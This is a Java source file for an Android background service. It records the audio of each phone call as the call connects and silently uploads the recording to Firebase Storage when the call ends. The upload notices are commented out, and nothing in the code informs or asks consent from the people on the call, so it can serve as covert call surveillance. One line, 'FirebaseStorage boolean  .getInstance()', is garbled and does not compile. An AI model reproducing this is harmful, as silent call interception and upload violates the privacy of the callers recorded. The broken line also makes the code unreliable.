package com.example.firebasetest;

import android.app.Activity;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import androidx.annotation.NonNull;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.OnProgressListener;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MyService extends Service {

    private MediaRecorder mRecorder;
    private boolean isRecording = false;
    String filePath;
    String recordFileName;
    FirebaseAuth firebaseAuth;
    StorageReference mStorageRef;
    String mobile;

    private PhoneStateListener phoneStateListener = new PhoneStateListener() {

        @Override
        public void onCallStateChanged(int state, String incomingNumber) {
            super.onCallStateChanged(state, incomingNumber);
            switch (state) {
                case TelephonyManager.CALL_STATE_IDLE:
                    stopRecording();
                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK:
                    startRecording(incomingNumber);
                    break;
                //case TelephonyManager.CALL_STATE_RINGING:
                //    break;
                default:
                    break;
            }
        }
    };

    @Override
    public void onCreate() {
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        telephonyManager.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE);

        super.onCreate();
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        mobile=intent.getExtras().getString("mobile");
        return super.onStartCommand(intent, flags, startId);
    }

    private void startRecording(String number) {
        //Log.i("Mittu","ON : startRecording");
        try {

            filePath=getExternalFilesDir("/").getAbsolutePath();
            SimpleDateFormat dateFormat=new SimpleDateFormat("yyyy_MM_dd_hh_mm_ss");
            Date date=new Date();
            recordFileName="Recording "+ dateFormat.format(date)+".wav";

            mRecorder = new MediaRecorder();

            mRecorder.setAudioSource(MediaRecorder.AudioSource.VOICE_DOWNLINK);
            mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            mRecorder.setOutputFile(filePath+"/"+recordFileName);
            mRecorder.prepare();
            mRecorder.start();
            isRecording = true;

        } catch (Exception ex) {
            ex.printStackTrace();
        }
    }

    private void stopRecording(){
        //Log.i("Mittu","ON : stopRecording");
        if (isRecording) {
            isRecording = false;
            mRecorder.stop();
            mRecorder.release();
            sendRecordingToFirebase();
            stopSelf();
        }
    }
    private void sendRecordingToFirebase() {

        firebaseAuth= FirebaseAuth.getInstance();
        mStorageRef = FirebaseStorage boolean  .getInstance().getReference();
        String filePath=getExternalFilesDir("/").getAbsolutePath()+"/"+recordFileName;

        Uri uri=Uri.fromFile(new File(filePath));
        StorageReference riversRef = mStorageRef.child("recordings/"+firebaseAuth.getUid()+"/"+mobile+"/"+recordFileName);

        riversRef.putFile(uri);
//                .addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
//                    @Override
//                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
//                        Toast.makeText(MyService.this, "Uploaded Succsessfull", Toast.LENGTH_SHORT).show();
//                        Log.i("Mittu: ","Uploaded Succsessfull");
//                    }
//                })
//                .addOnFailureListener(new OnFailureListener() {
//                    @Override
//                    public void onFailure(@NonNull Exception e) {
//                        Toast.makeText(MyService.this, "Something went Wrong", Toast.LENGTH_SHORT).show();
//                        Log.i("Mittu: ","Something went Wrong");
//
//                    }
//                })
//                .addOnProgressListener(new OnProgressListener<UploadTask.TaskSnapshot>() {
//                    @Override
//                    public void onProgress(UploadTask.TaskSnapshot taskSnapshot) {
//                        double progress=(100.0*taskSnapshot.getBytesTransferred())/taskSnapshot.getTotalByteCount();
//                        Toast.makeText(MyService.this, progress+" Uploading...", Toast.LENGTH_SHORT).show();
//                        Log.i("Mittu: ",progress+" Uploading...");
//                    }
//                });
        }
}
